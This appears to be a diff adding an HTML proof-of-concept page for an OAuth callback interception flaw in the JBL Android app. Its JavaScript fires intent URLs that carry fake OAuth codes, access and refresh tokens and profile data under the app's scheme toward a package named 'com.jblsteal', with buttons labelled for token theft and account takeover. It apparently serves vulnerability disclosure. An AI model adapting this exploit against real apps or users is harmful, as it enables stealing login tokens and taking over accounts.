@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>JBL OAuth Hijack POC</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            max-width: 700px; 
+            margin: 0 auto; 
+            padding: 20px;
+            line-height: 1.5;
+        }
+        .header {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            border-left: 4px solid #e60028;
+        }
+        .test-case {
+            background: #fff;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            padding: 12px;
+            margin: 8px 0;
+        }
+        button {
+            background: #e60028;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            margin: 3px;
+            width: auto;
+            min-width: 200px;
+        }
+        button:hover {
+            background: #c40022;
+        }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
+            padding: 12px;
+            border-radius: 4px;
+            margin: 15px 0;
+            font-size: 14px;
+        }
+        .result {
+            background: #e7f3ff;
+            border: 1px solid #b3d9ff;
+            padding: 12px;
+            border-radius: 4px;
+            margin-top: 15px;
+            display: none;
+            font-size: 13px;
+        }
+        h3 {
+            margin: 0 0 8px 0;
+            font-size: 16px;
+        }
+        h1 {
+            margin: 0;
+            font-size: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🔓 JBL OAuth Hijack Demonstration</h1>
+        <p style="margin: 5px 0 0 0; font-size: 14px;">OAuth Callback Interception Vulnerability</p>
+    </div>
+
+    <div class="warning">
+        <strong>⚠️ For Security Research Only</strong>
+    </div>
+
+    <div class="test-case">
+        <h3>🔑 Tidal OAuth Interception</h3>
+        <button onclick="testTidalHijack()">Intercept Tidal Login</button>
+    </div>
+
+    <div class="test-case">
+        <h3>🎵 Spotify Authorization Theft</h3>
+        <button onclick="testSpotifyHijack()">Intercept Spotify Login</button>
+    </div>
+
+    <div class="test-case">
+        <h3>👤 User Profile Data Theft</h3>
+        <button onclick="testProfileTheft()">Steal User Data</button>
+    </div>
+
+    <div class="test-case">
+        <h3>🚨 Full Account Takeover</h3>
+        <button onclick="testFullTakeover()">Simulate Account Takeover</button>
+    </div>
+
+    <div id="result" class="result">
+        <h3>📡 Interception Result</h3>
+        <pre id="result-text" style="margin: 0; font-size: 12px;">Waiting for interception...</pre>
+    </div>
+
+    <script>
+        function testTidalHijack() {
+            const tidalData = "intent://callback?code=tidal_auth_" + 
+                Math.random().toString(36).substr(2, 10) + 
+                "&state=security_token_" + Date.now() + 
+                "&scope=r_usr%20w_usr%20w_sub" + 
+                "#Intent;scheme=com.jbl.oneapp;package=com.jblsteal;end";
+            
+            showResult("Tidal OAuth Intercepted:\n" + decodeURIComponent(tidalData));
+            window.location = tidalData;
+        }
+
+        function testSpotifyHijack() {
+            const spotifyData = "intent://callback?code=spotify_" + 
+                Math.random().toString(36).substr(2, 12) + 
+                "&state=spotify_state_" + Date.now() + 
+                "&user_email=user" + Date.now() + "@example.com" + 
+                "#Intent;scheme=com.jbl.oneapp;package=com.jblsteal;end";
+            
+            showResult("Spotify OAuth Intercepted:\n" + decodeURIComponent(spotifyData));
+            window.location = spotifyData;
+        }
+
+        function testProfileTheft() {
+            const profileData = "intent://callback#access_token=profile_token_" + 
+                Math.random().toString(36).substr(2, 14) + 
+                "&user_id=user_" + Date.now() + 
+                "&email=testuser" + Date.now() + "@gmail.com" + 
+                "&name=Test%20User" + 
+                "&subscription=premium" + 
+                "#Intent;scheme=com.jbl.oneapp;package=com.jblsteal;end";
+            
+            showResult("User Profile Data Intercepted:\n" + decodeURIComponent(profileData));
+            window.location = profileData;
+        }
+
+        function testFullTakeover() {
+            const takeoverData = "intent://callback?code=full_takeover_" + 
+                Math.random().toString(36).substr(2, 8) + 
+                "&access_token=access_" + Math.random().toString(36).substr(2, 16) + 
+                "&refresh_token=refresh_" + Math.random().toString(36).substr(2, 16) + 
+                "&expires_in=3600" + 
+                "&token_type=Bearer" + 
+                "&user_id=jbl_user_" + Date.now() + 
+                "#Intent;scheme=com.jbl.oneapp;package=com.jblsteal;end";
+            
+            showResult("Full Account Takeover:\n" + decodeURIComponent(takeoverData));
+            window.location = takeoverData;
+        }
+
+        function showResult(message) {
+            document.getElementById('result').style.display = 'block';
+            document.getElementById('result-text').textContent = message;
+        }
+
+        // Show initial instructions
+        showResult("Click any test button to demonstrate OAuth interception.\nThe malicious app will receive OAuth tokens and user data.");
+    </script>
+
+    <div style="margin-top: 20px; padding: 12px; background: #f8f9fa; border-radius: 4px; font-size: 13px;">
+        <h4 style="margin: 0 0 8px 0;">📋 How This Works:</h4>
+        <ol style="margin: 0; padding-left: 20px;">
+            <li>Malicious app registers for <code>com.jbl.oneapp://callback</code></li>
+            <li>User clicks test button (simulates OAuth redirect)</li>
+            <li>Android opens malicious app instead of legitimate JBL app</li>
+            <li>OAuth tokens and user data are intercepted</li>
+        </ol>
+    </div>
+</body>
+</html>
